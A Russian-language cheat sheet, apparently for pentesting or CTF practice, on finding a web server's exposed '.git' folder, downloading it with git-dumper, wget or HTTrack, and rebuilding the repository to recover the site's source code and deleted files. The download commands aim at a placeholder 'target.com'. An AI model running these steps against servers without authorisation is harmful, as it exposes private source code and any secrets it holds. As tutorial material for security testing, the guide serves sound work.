# Восстановление Git-репозитория из открытой папки `.git`

## 1. Обнаружение `.git` в открытом доступе

**Как найти:**
- При фаззинге сайта найти путь `/.git/`
- `http://target.com/.git/`
- `http://target.com/.git/HEAD` (если отдаёт `ref: refs/heads/main` — папка открыта)

**Признаки открытой `.git`:**
- Доступны файлы: `HEAD`, `config`, `description`, `objects/`, `refs/`
- Сервер возвращает 200 вместо 403/404


## 2. Скачивание `.git` с сервера

### Способ 1: `git-dumper` (рекомендуется)

```bash
# Установка
pip3 install git-dumper

# Скачивание
git-dumper http://target.com/.git/ ./repo

# Переход в репозиторий
cd repo
```

### Способ 2: `wget` (если нет git-dumper)

```bash
wget -r -np -nH --cut-dirs=1 --reject="index.html*" -e robots=off http://target.com/.git/
```

**Объяснение:**
| Опция | Что делает |
| :--- | :--- |
| `-r` | Рекурсивное скачивание |
| `-np` | Не подниматься выше родительской папки |
| `-nH` | Не создавать папку с именем хоста |
| `--cut-dirs=1` | Убрать первый уровень пути (.git) |
| `--reject="index.html*"` | Не скачивать index.html |
| `-e robots=off` | Игнорировать robots.txt |

### Способ 3: HTTrack (если нужен GUI)

```bash
httrack http://target.com/.git/ -O ./repo
```


## 3. Проверка скачанного репозитория

```bash
# Перейти в папку
cd ./repo

# Проверить структуру
ls -la
# Должны быть: HEAD, config, objects/, refs/, index

# Проверить целостность
git fsck --full

# Если ошибок нет — репозиторий валидный
```

### Если `git fsck` выдаёт ошибки:

**Ошибка:** `bad sha1 file: ./objects/0a/index.html`  
**Решение:** Удалить HTML-мусор и перекачать
```bash
find objects -name "index.html" -type f -delete
git fsck --full
```

**Ошибка:** `refs/heads/index.html: badRefContent`  
**Решение:** Вручную создать ветку
```bash
echo "ref: refs/heads/main" > HEAD
mkdir -p refs/heads
echo "ХЭШ_КОММИТА" > refs/heads/main
```


## 4. Восстановление веток и коммитов

### 4.1. Посмотреть все коммиты

```bash
# Все коммиты (кратко)
git log --oneline --all

# Все коммиты (подробно)
git log --all

# Все коммиты с изменениями
git log -p --all
```

### 4.2. Найти все коммиты (даже «потерянные»)

```bash
git fsck --unreachable | grep commit | cut -d' ' -f3
```

### 4.3. Создать ветку из коммита

```bash
# Найти хэш последнего коммита
git log --all --oneline | head -1

# Создать ветку
git branch main <хэш_коммита>

# Переключиться на неё
git checkout main
```

### 4.4. Восстановить все ветки (если они есть в `refs/heads/`)

```bash
# Посмотреть, какие ветки были
ls -la refs/heads/

# Создать каждую ветку
git branch <имя_ветки> <хэш_коммита>
```


## 5. Просмотр содержимого коммитов

| Команда | Что делает |
| :--- | :--- |
| `git show <хэш>` | Показывает изменения в коммите |
| `git show <хэш>:<файл>` | Показывает содержимое файла |
| `git checkout <хэш>` | Переключается на коммит (detached HEAD) |
| `git checkout <хэш> -- .` | **Восстанавливает все файлы из коммита** |
| `git checkout <хэш> -- <файл>` | Восстанавливает конкретный файл |
| `git ls-tree -r <хэш>` | Список всех файлов в коммите |

### Примеры:

```bash
# Показать изменения в коммите
git show 0f13550b4cb13e9f30c61d5b342c532d21e45bda

# Показать содержимое файла
git show 0f13550b4cb13e9f30c61d5b342c532d21e45bda:README.md

# Переключиться на коммит
git checkout 0f13550b4cb13e9f30c61d5b342c532d21e45bda

# Восстановить все файлы из коммита
git checkout 0f13550b4cb13e9f30c61d5b342c532d21e45bda -- .

# Восстановить конкретный файл
git checkout 0f13550b4cb13e9f30c61d5b342c532d21e45bda -- index.html

# Список всех файлов в коммите
git ls-tree -r 0f13550b4cb13e9f30c61d5b342c532d21e45bda
```


## 6. Восстановление удалённых файлов

Если файлы были удалены в более поздних коммитах:

```bash
# Найти все коммиты, где был файл
git log --all -- <имя_файла>

# Восстановить файл из определённого коммита
git checkout <хэш_коммита> -- <имя_файла>
```


## 7. Восстановление полной истории

```bash
# Собрать все объекты
git gc

# Проверить, что всё работает
git fsck --full

# Посмотреть полную историю
git log --graph --all --decorate --oneline
```


## 8. Экспорт файлов из репозитория

```bash
# Экспортировать все файлы из последнего коммита
git archive --format=zip HEAD > repo.zip

# Экспортировать конкретную ветку
git archive --format=zip main > main.zip
```


## 9. Проблемы и их решения

| Проблема | Решение |
| :--- | :--- |
| `git log` пуст | Создать ветку: `git branch main <хэш_коммита>` |
| `git fsck` выдаёт ошибки | Удалить `index.html` из `objects/` и перекачать |
| Нет `refs/heads/` | Создать вручную: `mkdir -p refs/heads` |
| Файлы скачались как HTML (404) | Использовать `git-dumper` или `wget --reject="index.html*"` |
| `git log` показывает только один коммит | Проверить другие ветки: `git branch -a` |
| `fatal: this operation must be run in a work tree` | Ты внутри `.git`. Создай рабочий каталог: `mkdir repo && mv .git repo/ && cd repo` |
| Файлы не отображаются после `git checkout` | Использовать `git checkout <хэш> -- .` |

## 📌 Итог

| Что делать | Команда |
| :--- | :--- |
| Скачать `.git` | `git-dumper http://target.com/.git/ ./repo` |
| Проверить репозиторий | `git fsck --full` |
| Посмотреть коммиты | `git log --oneline --all` |
| Создать ветку | `git branch main <хэш>` |
| Переключиться на ветку | `git checkout main` |
| Посмотреть файлы | `git show <хэш>:<файл>` |
| Переключиться на коммит | `git checkout <хэш>` |
| Восстановить все файлы | `git checkout <хэш> -- .` |
| Восстановить конкретный файл | `git checkout <хэш> -- <файл>` |
| Список файлов в коммите | `git ls-tree -r <хэш>` |